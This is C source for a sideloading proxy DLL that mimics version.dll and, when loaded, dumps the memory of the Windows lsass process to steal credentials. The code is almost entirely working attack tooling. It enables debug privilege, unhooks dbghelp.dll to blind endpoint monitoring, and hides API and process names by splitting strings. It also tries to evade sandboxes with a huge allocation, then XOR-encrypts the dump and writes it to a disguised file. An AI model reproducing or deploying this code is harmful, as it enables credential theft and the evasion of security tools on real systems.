#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <DbgHelp.h>

#pragma comment(linker,"/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA,@1")
#pragma comment(linker,"/export:GetFileVersionInfoByHandle=C:\\Windows\\System32\\version.GetFileVersionInfoByHandle,@2")
#pragma comment(linker,"/export:GetFileVersionInfoExA=C:\\Windows\\System32\\version.GetFileVersionInfoExA,@3")
#pragma comment(linker,"/export:GetFileVersionInfoExW=C:\\Windows\\System32\\version.GetFileVersionInfoExW,@4")
#pragma comment(linker,"/export:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeA,@5")
#pragma comment(linker,"/export:GetFileVersionInfoSizeExA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeExA,@6")
#pragma comment(linker,"/export:GetFileVersionInfoSizeExW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeExW,@7")
#pragma comment(linker,"/export:GetFileVersionInfoSizeW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeW,@8")
#pragma comment(linker,"/export:GetFileVersionInfoW=C:\\Windows\\System32\\version.GetFileVersionInfoW,@9")
#pragma comment(linker,"/export:VerFindFileA=C:\\Windows\\System32\\version.VerFindFileA,@10")
#pragma comment(linker,"/export:VerFindFileW=C:\\Windows\\System32\\version.VerFindFileW,@11")
#pragma comment(linker,"/export:VerInstallFileA=C:\\Windows\\System32\\version.VerInstallFileA,@12")
#pragma comment(linker,"/export:VerInstallFileW=C:\\Windows\\System32\\version.VerInstallFileW,@13")
#pragma comment(linker,"/export:VerLanguageNameA=C:\\Windows\\System32\\version.VerLanguageNameA,@14")
#pragma comment(linker,"/export:VerLanguageNameW=C:\\Windows\\System32\\version.VerLanguageNameW,@15")
#pragma comment(linker,"/export:VerQueryValueA=C:\\Windows\\System32\\version.VerQueryValueA,@16")
#pragma comment(linker,"/export:VerQueryValueW=C:\\Windows\\System32\\version.VerQueryValueW,@17")

// Global variables the will hold the dump data and its size
LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 200); // Allocate 200MB buffer on the heap
DWORD dumpSize = 0;

typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID(WINAPI* MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL(WINAPI* UnmapViewOfFile_t)(LPCVOID);

unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };

PVOID GetLibraryProcAddress(PSTR LibraryName, PSTR ProcName) {
	return GetProcAddress(GetModuleHandleA(LibraryName), ProcName);
}

int UnhookModule(const HMODULE hDbghelp, const LPVOID pMapping) {
	/*
		UnhookDbghelp() finds .text segment of fresh loaded copy of Dbghelp.dll and copies over the hooked one
	*/
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)pMapping;
	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pidh->e_lfanew);
	int i;
	unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
	VirtualProtect_t VirtualProtect_p = (VirtualProtect_t)GetLibraryProcAddress((PSTR)sKernel32, (PSTR)sVirtualProtect);


	// find .text section
	for (i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pinh) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (strcmp((char*)pish->Name, ".text") == 0) {
			// prepare hDbghelp.dll memory region for write permissions.
			VirtualProtect_p((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
			if (!oldprotect) {
				// RWX failed!
				return -1;
			}
			// copy original .text section into hDbghelp memory
			memcpy((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)pish->VirtualAddress), (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize);

			// restore original protection settings of hDbghelp
			VirtualProtect_p((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, oldprotect, &oldprotect);
			if (!oldprotect) {
				// it failed
				return -1;
			}
			// all is good, time to go home
			return 0;
		}
	}
	// .text section not found?
	return -1;
}

void FreshCopy(unsigned char* modulePath, unsigned char* moduleName) {
	unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
	unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
	unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };

	int ret = 0;
	HANDLE hFile;
	HANDLE hFileMapping;
	LPVOID pMapping;

	CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t)GetLibraryProcAddress((PSTR)sKernel32, (PSTR)sCreateFileMappingA);
	MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t)GetLibraryProcAddress((PSTR)sKernel32, (PSTR)sMapViewOfFile);
	UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t)GetLibraryProcAddress((PSTR)sKernel32, (PSTR)sUnmapViewOfFile);

	// open the DLL
	hFile = CreateFileA((LPCSTR)modulePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		// failed to open the DLL
		printf("failed to open $s %u", modulePath, GetLastError());
	}

	// prepare file mapping
	hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (!hFileMapping) {
		// file mapping failed

		CloseHandle(hFile);
		printf("file mapping failed %u", GetLastError());
	}

	// map the bastard
	pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (!pMapping) {
		// mapping failed
		CloseHandle(hFileMapping);
		CloseHandle(hFile);
		printf("mapping failed %u", GetLastError());
	}

	// remove hooks
	ret = UnhookModule(GetModuleHandleA((LPCSTR)moduleName), pMapping);

	// Clean up.
	UnmapViewOfFile_p(pMapping);
	CloseHandle(hFileMapping);
	CloseHandle(hFile);
}

// Callback routine that we be called by the MiniDumpWriteDump function
BOOL CALLBACK DumpCallbackRoutine(PVOID CallbackParam, const PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {
	LPVOID destination = 0;
	LPVOID source = 0;
	DWORD bufferSize = 0;
	switch (CallbackInput->CallbackType) {
	case IoStartCallback:
		CallbackOutput->Status = S_FALSE;
		printf("[+] Starting dump to memory buffer\n");
		break;
	case IoWriteAllCallback:
		// Buffer holding the current chunk of dump data
		source = CallbackInput->Io.Buffer;

		// Calculate the memory address we need to copy the chunk of dump data to based on the current dump data offset
		destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)CallbackInput->Io.Offset);

		// Size of the current chunk of dump data
		bufferSize = CallbackInput->Io.BufferBytes;

		// Copy the chunk data to the appropriate memory address of our allocated buffer
		RtlCopyMemory(destination, source, bufferSize);
		dumpSize += bufferSize; // Incremeant the total size of the dump with the current chunk size

		//printf("[+] Copied %i bytes to memory buffer\n", bufferSize);

		CallbackOutput->Status = S_OK;
		break;
	case IoFinishCallback:
		CallbackOutput->Status = S_OK;
		printf("[+] Copied %i bytes to memory buffer\n", dumpSize);
		break;
	}
	return TRUE;
}

// Simple xor routine on memory buffer
void XOR(char* data, int data_len, char* key, int key_len)
{
	int j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1)
			j = 0;
		data[i] = data[i] ^ key[j];
		j++;
	}
}

// Enable se__deb$ugPrivilige if not enabled already
BOOL SetDebugPrivilege() {
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		printf("[-] Could not get current process token with TOKEN_ADJUST_PRIVILEGES\n");
		return FALSE;
	}

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

	char sPriv[] = { 'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e',0 };
	if (!LookupPrivilegeValueA(NULL, (LPCSTR)sPriv, &TokenPrivileges.Privileges[0].Luid)) {
		CloseHandle(hToken);
		printf("[-] No se__deb$ugPrivs. Make sure you are an admin\n");
		return FALSE;
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		CloseHandle(hToken);
		printf("[-] Could not adjust to se__deb$ugPrivs\n");
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}

// Find PID of a process by name
int FindPID(const char* procname)
{
	int pid = 0;
	PROCESSENTRY32 proc = {};
	proc.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	bool bProc = Process32First(snapshot, &proc);

	while (bProc)
	{
		if (strcmp(procname, proc.szExeFile) == 0)
		{
			pid = proc.th32ProcessID;
			break;
		}
		bProc = Process32Next(snapshot, &proc);
	}
	return pid;
}

int main(int argc, char** argv)
{
	// Find ls__a_ss PID
	printf("[+] Searching for ls__a_ss PID\n");
	char l$a$$[MAX_PATH];
	memset(l$a$$, 0, MAX_PATH);
	char ls[] = "ls";
	char as[] = "as";
	char s_[] = "s.e";
	char ex[] = "xe";

	strcat(l$a$$, ls);
	strcat(l$a$$, as);
	strcat(l$a$$, s_);
	strcat(l$a$$, ex);
	int pid = FindPID(l$a$$);
	if (pid == 0) {
		printf("[-] Could not find ls__a_ss PID\n");
		return -1;
	}
	printf("[+] ls__a_ss PID: %i\n", pid);

	// Make sure we have se__deb$ugPrivilege enabled
	if (!SetDebugPrivilege()) {
		return -1;
	}

	// Open handle to ls__a_ss
	HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
	if (hProc == NULL) {
		printf("[-] Could not open handle to ls__a_ss process\n");
		return -1;
	}

	// Create a "MINIDUMP_CALLBACK_INFORMATION" structure that points to our DumpCallbackRoutine as a CallbackRoutine
	MINIDUMP_CALLBACK_INFORMATION CallbackInfo = { 0 };
	CallbackInfo.CallbackRoutine = DumpCallbackRoutine;

	// Do full memory dump of ls__a_ss and use our CallbackRoutine to handle the dump data instead of writing it directly to disk
	typedef BOOL (WINAPI *MyMiniDumpWriteDump)(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE, PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION);

	char dbg$$h$lp[MAX_PATH];
	memset(dbg$$h$lp, 0, MAX_PATH);
	char db[] = "db";
	char gh[] = "ghel";
	char pd[] = "p.d";
	char ll[] = "ll";

	strcat(dbg$$h$lp, db);
	strcat(dbg$$h$lp, gh);
	strcat(dbg$$h$lp, pd);
	strcat(dbg$$h$lp, ll);

	char mi$$ni$du$p[MAX_PATH];
	memset(mi$$ni$du$p, 0, MAX_PATH);
	char mi[] = "Min";
	char iD[] = "iDum";
	char pW[] = "pWri";
	char tD[] = "teDu";
	char mp[] = "mp";

	strcat(mi$$ni$du$p, mi);
	strcat(mi$$ni$du$p, iD);
	strcat(mi$$ni$du$p, pW);
	strcat(mi$$ni$du$p, tD);
	strcat(mi$$ni$du$p, mp);

	HMODULE dbgMod = LoadLibrary(dbg$$h$lp);

	unsigned char sDbghelpPath[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','d','b','g','h','e','l','p','.','d','l','l',0 };
	unsigned char sDbghelp[] = { 'd','b','g','h','e','l','p','.','d','l','l', 0x0 };
	FreshCopy(sDbghelpPath, sDbghelp);

	MyMiniDumpWriteDump myMiniDumpWriteDump = (MyMiniDumpWriteDump)GetProcAddress(dbgMod, mi$$ni$du$p);

	BOOL success = myMiniDumpWriteDump(hProc, pid, NULL, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
	if (success) {
		printf("[+] Successfully dumped ls__a_ss to memory!\n");
		MessageBox(NULL, "OK", "OK", MB_OK);
	}
	else {
		printf("[-] Could not dump ls__a_ss to memory\n[-] Error Code: %i\n", GetLastError());
		return -1;
	}

	// Xor encrypt our dump data in memory using the specified key
	char key[] = "abc1234";
	printf("[+] Xor encrypting the memory buffer containing the dump data\n[+] Xor key: %s\n", key);
	XOR((char*)dumpBuffer, dumpSize, key, sizeof(key));

	// Create file to hold the encrypted dump data
	HANDLE hFile = CreateFile("sorpresa.txt", GENERIC_ALL, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	// Write the encrypted dump data to our file
	DWORD bytesWritten = 0;
	WriteFile(hFile, dumpBuffer, dumpSize, &bytesWritten, NULL);
	printf("[+] Enrypted dump data written to \"sorpresa.txt\" file\n");
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
	if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
		MessageBox(NULL, "Running", "Running", MB_OK);
		
		char* mem = NULL;
		mem = (char*)malloc(6442450944);
		
		if (mem != NULL) {
			memset(mem, 00, 6442450944);
			free(mem);
			main(0, {});
		}
	}
	return TRUE;
}
